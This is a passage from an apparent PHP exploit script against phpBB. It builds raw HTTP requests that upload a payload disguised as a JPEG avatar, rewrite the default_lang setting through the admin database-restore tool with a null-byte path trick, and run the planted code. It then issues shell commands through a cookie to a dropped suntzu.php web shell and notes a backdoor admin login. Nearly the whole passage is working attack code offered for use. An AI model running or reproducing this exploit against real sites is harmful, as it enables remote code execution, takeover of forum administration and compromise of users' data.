Content-Disposition: form-data; name=&quot;avatar&quot;; filename=&quot;whatever.jpeg&quot;;
Content-Type: image/pjpeg

'.$avatar.'
-----------------------------7d62702f250530
Content-Disposition: form-data; name=&quot;avatarurl&quot;


-----------------------------7d62702f250530
Content-Disposition: form-data; name=&quot;avatarremoteurl&quot;


-----------------------------7d62702f250530
Content-Disposition: form-data; name=&quot;mode&quot;

editprofile
-----------------------------7d62702f250530
Content-Disposition: form-data; name=&quot;agreed&quot;

true
-----------------------------7d62702f250530
Content-Disposition: form-data; name=&quot;coppa&quot;

0
-----------------------------7d62702f250530
Content-Disposition: form-data; name=&quot;user_id&quot;

999999
-----------------------------7d62702f250530
Content-Disposition: form-data; name=&quot;current_email&quot;


-----------------------------7d62702f250530
Content-Disposition: form-data; name=&quot;submit&quot;

Submit
-----------------------------7d62702f250530--
';

$packet=&quot;POST &quot;.$p.&quot;profile.php HTTP/1.0\r\n&quot;;
$packet.=&quot;Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, */*\r\n&quot;;
$packet.=&quot;Referer: http://&quot;.$host.$path.&quot;profile.php?mode=editprofile\r\n&quot;;
$packet.=&quot;Accept-Language: it\r\n&quot;;
$packet.=&quot;Content-Type: multipart/form-data; boundary=---------------------------7d62702f250530\r\n&quot;;
$packet.=&quot;Accept-Encoding: gzip, deflate\r\n&quot;;
$packet.=&quot;User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)\r\n&quot;;
$packet.=&quot;Host: &quot;.$host.&quot;\r\n&quot;;
$packet.=&quot;Content-Length: &quot;.strlen($data).&quot;\r\n&quot;;
$packet.=&quot;Connection: Close\r\n&quot;;
$packet.=&quot;Cache-Control: no-cache\r\n&quot;;
$packet.=&quot;Cookie: &quot;.$cookie.&quot;\r\n\r\n&quot;;
$packet.=$data;
sendpacketii($packet);
sleep(1);

echo &quot;step 4 -&gt; retrieve new filename for avatar from profile page...\r\n&quot;;
$packet=&quot;GET &quot;.$p.&quot;profile.php?mode=editprofile HTTP/1.0\r\n&quot;;
$packet.=&quot;Host: &quot;.$host.&quot;\r\n&quot;;
$packet.=&quot;Cookie: &quot;.$cookie.&quot;\r\n\r\n&quot;;
$packet.=&quot;Connection: Close\r\n\r\n&quot;;
sendpacketii($packet);
$temp=explode(&quot;images/avatars/&quot;,$html);
$temp2=explode(&quot;\&quot;&quot;,$temp[1]);
$avatar_name=$temp2[0];
echo &quot;avatar filename -&gt; &quot;.$avatar_name.&quot;\r\n&quot;;
if ($avatar_name=='') {die(&quot;Unable to retrieve filename...&quot;);}

echo &quot;step 5 -&gt; replace default_lang value in phpbb_config table with our path to shell, breaking path with a null char...\r\n&quot;;
$sql='
#
# our path to avatar, using a null char to break the path
#

UPDATE phpbb_config SET config_value=CONCAT(&quot;english/../../images/avatars/'.$avatar_name.'&quot;,CHAR(0)) where config_name=&quot;default_lang&quot;;

';

$data='-----------------------------7d62702f250530
Content-Disposition: form-data; name=&quot;backup_file&quot;; filename=&quot;suntzu.sql&quot;;
Content-Type: text/plain

'.$sql.'
-----------------------------7d62702f250530
Content-Disposition: form-data; name=&quot;perform&quot;

restore
-----------------------------7d62702f250530
Content-Disposition: form-data; name=&quot;restore_start&quot;

Start Restore
-----------------------------7d62702f250530--
';
$packet=&quot;POST &quot;.$p.&quot;admin/admin_db_utilities.php?sid=&quot;.$session_id.&quot; HTTP/1.0\r\n&quot;;
$packet.=&quot;Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, */*\r\n&quot;;
$packet.=&quot;Referer: http://&quot;.$host.$path.&quot;profile.php?mode=editprofile\r\n&quot;;
$packet.=&quot;Accept-Language: it\r\n&quot;;
$packet.=&quot;Content-Type: multipart/form-data; boundary=---------------------------7d62702f250530\r\n&quot;;
$packet.=&quot;Accept-Encoding: gzip, deflate\r\n&quot;;
$packet.=&quot;User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)\r\n&quot;;
$packet.=&quot;Host: &quot;.$host.&quot;\r\n&quot;;
$packet.=&quot;Content-Length: &quot;.strlen($data).&quot;\r\n&quot;;
$packet.=&quot;Connection: Close\r\n&quot;;
$packet.=&quot;Cache-Control: no-cache\r\n&quot;;
$packet.=&quot;Cookie: &quot;.$cookie.&quot;\r\n\r\n&quot;;
$packet.=$data;
sendpacketii($packet);
if (eregi(&quot;The Database has been successfully restored&quot;,$html))
{
echo &quot;Done...\r\n&quot;;
}
else
{
die(&quot;Unable to modify table...&quot;);
}

echo &quot;step 6 -&gt; execute code inside jpeg file\r\n&quot;;
$packet=&quot;GET &quot;.$p.&quot;faq.php HTTP/1.0\r\n&quot;;
$packet.=&quot;Host: &quot;.$host.&quot;\r\n&quot;;
$packet.=&quot;Connection: Close\r\n\r\n&quot;;
sendpacketii($packet);
sleep(1);

echo &quot;step 7 -&gt; Launch commands...\r\n&quot;;
$packet=&quot;GET &quot;.$p.&quot;suntzu.php HTTP/1.0\r\n&quot;;
$packet.=&quot;Host: &quot;.$host.&quot;\r\n&quot;;
$packet.=&quot;Cookie: cmd=dir;\r\n&quot;;
$packet.=&quot;Connection: Close\r\n\r\n&quot;;
sendpacketii($packet);
if (strstr($html,&quot;56789&quot;))
{
  echo &quot;Exploit succeeded...\r\n&quot;;
  $temp=explode(&quot;56789&quot;,$html);
  echo &quot;\r\n&quot;.$temp[1].&quot;\r\n&quot;;
}
else
{
  echo &quot;Exploit failed...however you will be able to login as admin\r\n&quot;;
  echo &quot;with username \&quot;suntzu\&quot; and password \&quot;suntzu\&quot;\r\n&quot;;
}


echo &quot;step 8 -&gt; restore phpbb_config with the old value to keep the board accessible\r\n&quot;;
$sql='
#
# old value for default_lang
#

UPDATE phpbb_config SET config_value=&quot;english&quot; where config_name=&quot;default_lang&quot;;

';

$data='-----------------------------7d62702f250530
Content-Disposition: form-data; name=&quot;backup_file&quot;; filename=&quot;suntzu.sql&quot;;
Content-Type: text/plain

'.$sql.'
-----------------------------7d62702f250530
Content-Disposition: form-data; name=&quot;perform&quot;

restore
-----------------------------7d62702f250530
Content-Disposition: form-data; name=&quot;restore_start&quot;

Start Restore
-----------------------------7d62702f250530--
';
$packet=&quot;POST &quot;.$p.&quot;admin/admin_db_utilities.php?sid=&quot;.$session_id.&quot; HTTP/1.0\r\n&quot;;
$packet.=&quot;Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, */*\r\n&quot;;
$packet.=&quot;Referer: http://&quot;.$host.$path.&quot;profile.php?mode=editprofile\r\n&quot;;
$packet.=&quot;Accept-Language: it\r\n&quot;;
$packet.=&quot;Content-Type: multipart/form-data; boundary=---------------------------7d62702f250530\r\n&quot;;
$packet.=&quot;Accept-Encoding: gzip, deflate\r\n&quot;;
$packet.=&quot;User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)\r\n&quot;;
$packet.=&quot;Host: &quot;.$host.&quot;\r\n&quot;;
$packet.=&quot;Content-Length: &quot;.strlen($data).&quot;\r\n&quot;;
$packet.=&quot;Connection: Close\r\n&quot;;
$packet.=&quot;Cache-Control: no-cache\r\n&quot;;
$packet.=&quot;Cookie: &quot;.$cookie.&quot;\r\n\r\n&quot;;
$packet.=$data;
sendpacketii($packet);
if (eregi(&quot;The Database has been successfully restored&quot;,$html))
{
echo &quot;Done...\r\n&quot;;
}
else
{
die(&quot;Unable to modify table...&quot;);
}
?&gt;
</span></span>
</code></pre>
